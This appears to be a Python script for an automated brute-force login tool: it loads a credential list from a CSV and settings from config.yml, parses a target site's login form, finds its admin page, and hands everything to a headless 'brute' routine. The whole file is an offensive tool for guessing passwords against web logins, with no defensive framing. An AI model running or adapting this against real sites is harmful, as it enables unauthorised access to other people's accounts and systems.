from datetime import datetime
import attack1
import WebInfo
import pandas
import webParser
import logging
import sys
import json
import yaml
from attack import headless
class LoginBrute:
    async def main():
    
        logging.basicConfig(
            filename="logs/" + datetime.now().strftime("%d-%m-%Y %H-%M") + ".log",
            filemode="w",
            level=logging.INFO,
        )

        try:

            with open("config.yml", "r") as ymlfile:
                args = yaml.safe_load(ymlfile)


            pass_user = pandas.read_csv(args["pass_user"])

        except IOError as e:
            logging.error(e)
            sys.exit()
        
        web_parser = webParser.webParser()
        await web_parser.getsource(args['url'], args['params_list'])
        
        args['req_body'] = web_parser.post_data
        args['method'] = web_parser.method
        args['headers'] = web_parser.headers
        args['req_body_type'] = web_parser.req_body_type
        args['button'] = web_parser.button
        args["url"] = WebInfo.get_admin_page(args['url'])
        args["type"] = "javascript"  #
        args['user_param'], args['password_param'] = web_parser.user_param, web_parser.password_param
   
        args['headers'] = {k.lower(): v for k, v in web_parser.headers.items()}
        
        for param in args['headers']:
            args['headers'][param] = str(args['headers'][param])

        # remove content length and cookies from headers
        if 'cookie' in args['headers']:
            args['headers'].pop('cookie')
            
        if 'content-length' in args['headers']:
            args['headers'].pop('content-length')
        

        args.update(pass_user)

        logging.info(json.dumps(args, indent=2, default=str))

        await headless.brute(args)

import asyncio
asyncio.run(LoginBrute.main())
